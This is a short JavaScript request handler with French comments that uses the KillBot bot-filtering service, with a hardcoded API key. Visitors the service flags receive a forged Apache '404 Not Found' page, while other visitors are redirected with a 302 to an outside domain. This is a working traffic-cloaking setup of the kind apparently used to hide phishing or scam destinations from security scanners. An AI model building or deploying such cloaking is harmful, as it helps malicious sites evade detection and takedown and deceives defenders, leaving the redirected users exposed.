import KillBot from 'killbot.to';

const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

function isLocalIp(ip) {
  // Simplification : on exclut 127.x, 192.168.x, 10.x, ::1
  return (
    ip.startsWith('127.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.') ||
    ip === '::1'
  );
}

export default async function handler(req, res) {
  try {
    // Extraire IP depuis x-forwarded-for OU remoteAddress
    let ip =
      req.headers['x-forwarded-for']?.split(',')[0].trim() ||
      req.socket?.remoteAddress ||
      '0.0.0.0';

    const userAgent = req.headers['user-agent'] || 'Unknown-UA';

    // S’il s’agit d’une IP locale, on peut SKIP KillBot
    if (isLocalIp(ip)) {
      console.log('KillBot: IP locale détectée, on ignore...');
      // Soit tu renvoies direct la redirection, soit tu laisses passer
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }

    // Sinon, on appelle killBot.check({ ip, ua })
    const result = await killBot.check({ ip, ua: userAgent });

    if (result.block) {
      const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
  <title>404 Not Found</title>
</head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server Port 80</address>
</body>
</html>`;
      return res.status(404).send(fake404);
    } else {
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }
  } catch (err) {
    console.error('KillBot error:', err);
    return res.status(500).send('Internal Server Error');
  }
}